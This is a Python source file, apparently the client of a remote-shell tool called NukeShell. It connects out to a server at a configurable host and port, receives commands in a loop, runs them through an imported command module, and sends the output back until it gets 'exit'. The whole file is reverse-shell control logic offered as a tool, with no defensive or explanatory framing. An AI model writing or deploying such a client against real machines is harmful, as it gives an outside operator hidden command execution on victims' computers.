#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author : LimerBoy
# github.com/LimerBoy/NukeShell

# Import modules
import Core.server as Server
import Core.commands as Command
from argparse import ArgumentParser
from os import system, name, devnull

# Change default encoding if running on windows
if name == "nt":
    system("chcp 65001 > " + devnull)

# Parse arguments
parser = ArgumentParser(description="NukeShell client arguments")
parser.add_argument("--host", type=str, default="127.0.0.1", help="Connect to IP")
parser.add_argument("--port", type=int, default=5125, help="Connect to port")
args = parser.parse_args()

# Server settings
SERVER_HOST = args.host
SERVER_PORT = args.port

# Connect to server
server = Server.ConnectServer(SERVER_HOST, SERVER_PORT)

command = ""
while command.lower() != "exit":
    # Receive commands from server
    command = server.Read()
    # Run command
    output = Command.Run(command, server)
    # Send command response
    server.Send(output)
# Close connection
server.Disconnect()
